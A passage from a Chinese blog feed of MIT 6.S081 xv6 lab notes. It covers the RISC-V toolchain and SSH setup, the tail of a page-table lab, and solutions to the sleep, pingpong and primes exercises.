class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Create a new process, copying the parent.</span><br><span class="hljs-comment">// Sets up child kernel stack to return as if from fork() system call.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i, pid;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">np</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  <span class="hljs-comment">// Allocate process.</span><br>  <span class="hljs-keyword">if</span>((np = allocproc()) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Copy user memory from parent to child.</span><br>  <span class="hljs-keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span>)&#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  np-&gt;sz = p-&gt;sz;<br><br>  np-&gt;parent = p;<br><br>  <span class="hljs-comment">// copy saved user registers.</span><br>  *(np-&gt;trapframe) = *(p-&gt;trapframe);<br><br>  <span class="hljs-comment">// Cause fork to return 0 in the child.</span><br>  np-&gt;trapframe-&gt;a0 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// increment reference counts on open file descriptors.</span><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NOFILE; i++)<br>    <span class="hljs-keyword">if</span>(p-&gt;ofile[i])<br>      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);<br>  np-&gt;cwd = idup(p-&gt;cwd);<br>  u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br>  safestrcpy(np-&gt;name, p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br><br>  pid = np-&gt;pid;<br><br>  np-&gt;state = RUNNABLE;<br><br>  release(&amp;np-&gt;lock);<br><br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><p>在exec函数加上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br>  <span class="hljs-comment">// Push argument strings, prepare rest of stack in ustack.</span><br>  <span class="hljs-keyword">for</span>(argc = <span class="hljs-number">0</span>; argv[argc]; argc++) &#123;<br>    <span class="hljs-keyword">if</span>(argc &gt;= MAXARG)<br>      <span class="hljs-keyword">goto</span> bad;<br>    sp -= <span class="hljs-built_in">strlen</span>(argv[argc]) + <span class="hljs-number">1</span>;<br>    sp -= sp % <span class="hljs-number">16</span>; <span class="hljs-comment">// riscv sp must be 16-byte aligned</span><br>    <span class="hljs-keyword">if</span>(sp &lt; stackbase)<br>      <span class="hljs-keyword">goto</span> bad;<br>    <span class="hljs-keyword">if</span>(copyout(pagetable, sp, argv[argc], <span class="hljs-built_in">strlen</span>(argv[argc]) + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">goto</span> bad;<br>    ustack[argc] = sp;<br>  &#125;<br></code></pre></td></tr></table></figure><p>growproc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Grow or shrink user memory by n bytes.</span><br><span class="hljs-comment">// Return 0 on success, -1 on failure.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">growproc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>  uint sz;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  sz = p-&gt;sz;<br>  <span class="hljs-keyword">if</span>(n &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">if</span>((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    u2kvmcopy(p-&gt;pagetable, p-&gt;kpgtable, sz-n, sz);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">0</span>)&#123;<br>    sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);<br>  &#125;<br>  p-&gt;sz = sz;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230520212417687.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/rocketeerLi/article/details/121524760">https://blog.csdn.net/rocketeerLi/article/details/121524760</a></li><li><a href="https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/#38-lab-3-pgtbl">https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/#38-lab-3-pgtbl</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>MIT6S081</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081导言</title>
    <link href="/p/92b97892/"/>
    <url>/p/92b97892/</url>
    
    <content type="html"><![CDATA[<h1 id="MIT-6-S081"><a href="#MIT-6-S081" class="headerlink" title="MIT-6.S081"></a>MIT-6.S081</h1><p>已完成：</p><ul><li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/LaPhilosophie/MIT-6.S081/tree/main/Preparation">Preparation</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/LaPhilosophie/MIT-6.S081/tree/main/Lab1%20Xv6%20and%20Unix%20utilities">Lab1 Xv6 and Unix utilities</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/LaPhilosophie/MIT-6.S081/tree/main/Lab2%20syscall%20System%20calls">Lab2 syscall System calls</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/c98013d5/">Lab3 page table</a></li></ul><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>这部分比较麻烦，需要我们配置xv6的编译、调试环境、安装编译链等，由于GFW的原因，这个阶段会比较egg pain。比如：</p><ul><li>需要在x64机器上生成riscv的可执行文件，因此需要交叉编译器，也即是<strong>riscv-gnu-toolchain</strong>（源码8GB，动不动就网络错误）</li><li>qemu作为模拟器去运行xv6系统</li><li>使用qemu-gdb remote进行调试</li><li>拉取源码，测试使用make grade自动评分</li><li>ssh、虚拟机配置等等</li></ul><p>官方的环境搭建指导：<a href="https://pdos.csail.mit.edu/6.828/2020/tools.html">https://pdos.csail.mit.edu/6.828/2020/tools.html</a> <strong>部分如下所述并不同于官方的环境搭建方式：</strong></p><h2 id="安装编译链"><a href="#安装编译链" class="headerlink" title="安装编译链"></a>安装编译链</h2><p>使用apt安装一些依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install autoconf automake autotools-dev curl libmpc-dev libmpfr-dev libgmp-dev gawk build-essential bison flex texinfo gperf libtool patchutils bc zlib1g-dev libexpat-dev<br>$ sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu <br></code></pre></td></tr></table></figure><blockquote><p><strong>交叉编译器</strong>（英语：Cross compiler）是指一个在某个<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">系统平台</a>下可以产生另一个<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">系统平台</a>的<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">可执行文件</a>的<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E8%AF%91%E5%99%A8">编译器</a>。交叉编译器在目标<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">系统平台</a>（开发出来的应用程序序所运行的平台）难以或不容易<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E8%AF%91">编译</a>时非常有用</p></blockquote><p>由于<strong>riscv-gnu-toolchain总大小约有8GB左右</strong>，通过官方的apt和下载源码的方式都非常的慢，甚至经常中断下载，多次尝试无果后，我使用了在宿主机上下载源码包（使用idm多线程下载github的源码或者百度云现成的源码文件），之后将这一大坨<code>.tar.gz</code>源码复制到Ubuntu虚拟机的方式获取源码，之后进行编译</p><p>解压，之后进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> tar zxvf *.gz</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> riscv-gnu-toolchain</span><br><span class="hljs-meta">$</span><span class="bash"> ./configure --prefix=/usr/<span class="hljs-built_in">local</span></span><br><span class="hljs-meta">$</span><span class="bash"> sudo make -j8</span><br></code></pre></td></tr></table></figure><p>这个编译过程将会十分漫长，虚拟机配置低甚至会卡死，建议开个tmux，detach之后使用-j多核编译选项</p><p>编译之后环境就全部配好了，测试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ riscv64-unknown-elf-gcc --version <span class="hljs-comment">#查看是不是有版本信息输出</span><br>$ qemu-system-riscv64 --version<br></code></pre></td></tr></table></figure><p>从github下载xv6源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git://github.com/mit-pdos/xv6-riscv-fall19.git<br></code></pre></td></tr></table></figure><p>编译xv6内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make qemu<br>$<br></code></pre></td></tr></table></figure><p>正常编译成功会得到xv6的终端的提示符，这里我遇到了版本过高的问题，导致依赖错误，无法安装，卸载高版本即可</p><p>使用<code>Ctrl-a x</code>退出</p><p>顺便看一下riscv-gnu-toolchain恐怖的大小，就知道为什么用git或者apt 下不下来了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> du -hs ../*</span><br>8.0G    ../riscv-gnu-toolchain<br>3.6G    ../riscv-gnu-toolchain.tar.gz<br>26M     ../xv6-riscv<br></code></pre></td></tr></table></figure><h2 id="虚拟机初始设置"><a href="#虚拟机初始设置" class="headerlink" title="虚拟机初始设置"></a>虚拟机初始设置</h2><ul><li>使用22.04 Ubuntu LTS虚拟机</li><li>apt换源、update、upgrade</li><li>配置vmware tools</li><li>安装编译依赖</li></ul><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>我的宿主机是Windows，xv6安装在Ubuntu虚拟机中</p><p>被连接的主机必须要安装openssh服务，比如我要连接到我的Debian或者Ubuntu，那么他们都需要安装openssh</p><p>Debian或者Ubuntu的安装如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install openssh-server<br></code></pre></td></tr></table></figure><p>遇到了依赖错误，导致无法安装openssh-server，卸载openssh-client之后安装openssh-server即可</p><p>启动服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo service sshd start<br></code></pre></td></tr></table></figure><p>查看是否已经启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -ef | grep sshd<br></code></pre></td></tr></table></figure><p><strong>生成公钥与私钥，：</strong></p><p>使用key-gen命令生成公钥与私钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh-keygen</span><br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/c/Users/xxx/.ssh/id_rsa):<br></code></pre></td></tr></table></figure><p>之后修改服务器的authorized_keys文件，也即将上述步骤中生成的公钥（.pub文件）写入到远程服务器的 <code>~/.ssh/authorized_keys</code>文件中</p><h2 id="run-amp-debug"><a href="#run-amp-debug" class="headerlink" title="run&amp;debug"></a>run&amp;debug</h2><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>在Makefile所在文件目录输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br></code></pre></td></tr></table></figure><p>QEMU 的虚拟 BIOS 将从包含在 xv6.img 文件中的虚拟硬盘映像加载 xv6的引导加载程序，boot loader将依次加载并运行 xv6内核</p><p>在命令行上，将会出现许多提示文字，最后一行会有一个$，表示是xv6系统的命令提示符</p><p>如果想要结束QEMU 会话，并销毁 xv6虚拟机的状态，按下Ctrl-C即可</p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>在xv6目录，打开一个shell，输入 make qemu-gdb，qemu会卡住，等待gdb与他连接</p><p>在xv6目录打开另一个shell，输入riscv64-unknown-elf-gdb，即可远程debug</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://web.archive.org/web/20190308091152/http://zoo.cs.yale.edu:80/classes/cs422/2011/lec/l2-hw">https://web.archive.org/web/20190308091152/http://zoo.cs.yale.edu:80/classes/cs422/2011/lec/l2-hw</a></li><li><a href="https://blog.csdn.net/weixin_48156266/article/details/123663977">https://blog.csdn.net/weixin_48156266/article/details/123663977</a></li><li><a href="https://github.com/riscv-collab/riscv-gnu-toolchain">https://github.com/riscv-collab/riscv-gnu-toolchain</a></li></ul><h1 id="Lab1-Xv6-and-Unix-utilities"><a href="#Lab1-Xv6-and-Unix-utilities" class="headerlink" title="Lab1 Xv6 and Unix utilities"></a>Lab1 Xv6 and Unix utilities</h1><blockquote><p>进行系统工具（比如find、xargs）的编写，主要是让你去熟悉操作系统API。这里最有趣的是primes程序，要求你使用并发的方式实现素数筛，涉及管道、进程通信、并发、递归</p></blockquote><p>官方文档：<a href="https://pdos.csail.mit.edu/6.828/2020/labs/util.html">https://pdos.csail.mit.edu/6.828/2020/labs/util.html</a></p><h2 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> git <span class="hljs-built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2020 <span class="hljs-comment"># 拉取仓库</span></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> xv6-labs-2020</span><br><span class="hljs-meta">$</span><span class="bash"> git checkout util <span class="hljs-comment"># 切换分支</span></span><br><span class="hljs-meta">$</span><span class="bash"> make</span> <br><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br><span class="hljs-meta">$</span><span class="bash"> make grade <span class="hljs-comment"># 自动评测所有的程序</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./grade-lab-util sleep <span class="hljs-comment"># 评测单个程序sleep</span></span><br></code></pre></td></tr></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p>Implement the UNIX program <code>sleep</code> for xv6; your <code>sleep</code> should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip. Your solution should be in the file <code>user/sleep.c</code>.</p><ul><li>在Makefile中的UPROG下面加入sleep</li><li>在user目录创建sleep.c文件</li><li>sleep.c加入的三个头文件是模仿了其他user/目录的风格</li><li>首先进行参数的检查，异常则退出</li><li>直接调用sleep()函数即可，可以在别的程序中找到这种用法</li><li>exit(0)退出程序</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;Usage: sleep [times]\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    sleep(atoi(argv[<span class="hljs-number">1</span>]));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>报错：user/sh.c:58:1: error: infinite recursion detected [-Werror=infinite-recursion]，解决办法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h2><p>Write a program that uses UNIX system calls to ‘’ping-pong’’ a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print “<pid>: received ping”, where <pid> is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print “<pid>: received pong”, and exit. Your solution should be in the file <code>user/pingpong.c</code>.</p><ul><li>int fd[2]创建管道，fd[0]读、fd[1]写</li><li>管道用法：一般先创建一个管道，然后进程使用fork函数创建子进程，之后父进程关闭管道的读端，子进程关闭管道的写端</li><li>调用fork 后，父进程的 fork() 会返回子进程的 PID，子进程的fork返回 0</li><li>注意到write系统调用是<code>ssize_t write(int fd, const void *buf, size_t count);</code>，因此写入的字节是一个地址，由于我们声明buf是一个char类型，因此需要填入&amp;buf</li><li>这里踩了一个坑，把pingpong写成了pingpang导致错误</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd1[<span class="hljs-number">2</span>],fd2[<span class="hljs-number">2</span>];<br>    pipe(fd1);<br>    pipe(fd2);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <br>    <span class="hljs-comment">// child</span><br>    <span class="hljs-comment">// print &quot;&lt;pid&gt;: received ping&quot;</span><br>    <span class="hljs-comment">// write back to parent a byte and exit </span><br>    <span class="hljs-comment">// close fd[1]</span><br>    <span class="hljs-comment">// zero for read and 1 for read </span><br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)  <br>    &#123;<br>        close(fd1[<span class="hljs-number">1</span>]);<span class="hljs-comment">//close write </span><br>        close(fd2[<span class="hljs-number">0</span>]);<span class="hljs-comment">//close read </span><br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">3</span>];<br>        read(fd1[<span class="hljs-number">0</span>],&amp;buf,<span class="hljs-number">1</span>);<span class="hljs-comment">//read a byte from parent</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received ping\n&quot;</span>,getpid()); <br>        write(fd2[<span class="hljs-number">1</span>],&amp;buf,<span class="hljs-number">1</span>);<span class="hljs-comment">//write back to parent </span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// parent</span><br>    <span class="hljs-comment">// send a byte to the child </span><br>    <span class="hljs-comment">// close fd[0]</span><br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        close(fd1[<span class="hljs-number">0</span>]);<span class="hljs-comment">//close read </span><br>        close(fd2[<span class="hljs-number">1</span>]);<span class="hljs-comment">//close write </span><br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">3</span>];<br>        write(fd1[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">// send a byte to the child</span><br>        read(fd2[<span class="hljs-number">0</span>],&amp;buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received pong\n&quot;</span>,getpid()); <br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230208224322.png"></p><h2 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h2><p>Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down <a href="http://swtch.com/~rsc/thread/">this page</a> and the surrounding text explain how to do it. Your solution should be in the file <code>user/primes.c</code>.</p><p>Your goal is to use <code>pipe</code> and <code>fork</code> to set up the pipeline. The first process feeds the numbers 2 through 35 into the pipeline. For each prime number, you will arrange to create one process that reads from its left neighbor over a pipe and writes to its right neighbor over another pipe. Since xv6 has limited number of file descriptors and processes, the first process can stop at 35.</p><ul><li>使用pipe和fork来设置管道</li><li>由于xv6文件描述符很少，所以需要关闭所有不必要的文件描述符，否则将会导致描述符耗尽</li><li>主要的素数进程应该只有在所有的输出都打印出来之后，并且在所有其他的素数进程都退出之后才能退出</li><li>关于read的用法：当管道的写端关闭时，read 返回零，这个可以控制while的终止条件</li><li>修改Makefile 的 UPROGS</li></ul><p>普通的C语言写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes2</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br><br>        <span class="hljs-keyword">if</span>(!st[i]) primes[cnt++]=i;<span class="hljs-comment">//把素数存起来</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&lt;=n;j+=i)&#123;<span class="hljs-comment">//不管是合数还是质数，都用来筛掉后面它的倍数</span><br>            st[j]=<span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes1</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!st[i])&#123;<br>            primes[cnt++]=i;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&lt;=n;j+=i) st[j]=<span class="hljs-literal">true</span>;<span class="hljs-comment">//可以用质数就把所有的合数都筛掉；</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>并发编程的思路不同于以上方式，我们可以给出伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p = get a number from left neighbor<br>print p<br>loop:<br>    n = get a number from left neighbor<br>    <span class="hljs-keyword">if</span> (p does <span class="hljs-keyword">not</span> divide n)<br>        send n to right neighbor<br></code></pre></td></tr></table></figure><p>一个生成过程可以将数字2、3、4、 … … 35输入管道的左端: 管道中的第一个过程消除了2的倍数，第二个过程消除了3的倍数，第三个过程消除了5的倍数，依此类推</p><blockquote><p><a href="https://swtch.com/~rsc/thread/">https://swtch.com/~rsc/thread/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230227125558.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 